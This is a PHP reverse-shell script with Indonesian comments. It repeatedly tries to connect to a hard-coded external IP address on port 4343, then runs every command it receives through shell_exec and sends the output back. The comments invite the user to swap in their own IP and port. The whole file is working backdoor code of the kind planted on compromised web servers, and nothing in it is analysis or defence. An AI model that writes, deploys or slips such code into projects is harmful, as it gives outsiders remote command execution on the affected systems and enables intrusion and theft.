<?php
// Ganti IP dan PORT dengan milik Anda
$ip = '140.213.158.142';
$port = 4343;

while (true) {
    // Coba membuka socket
    $sock = @fsockopen($ip, $port, $errno, $errstr, 30);

    if (!$sock) {
        // Jika tidak terhubung, tunggu sebentar dan coba lagi
        echo "Tidak dapat terhubung ke $ip:$port. Mencoba lagi...\n";
        sleep(5); // Tunggu selama 5 detik sebelum mencoba lagi
    } else {
        // Jika berhasil terhubung
        echo "Berhasil terhubung ke $ip:$port.\n";
        
        // Mengarahkan input, output, dan error ke socket
        stream_set_blocking($sock, true);
        fwrite($sock, "Connection established.\n");
        while ($command = fgets($sock, 1024)) {
            $output = shell_exec(trim($command));
            fwrite($sock, $output . "\n");
        }
        fclose($sock);
        break; // Keluar setelah koneksi berhasil
    }
}
?>
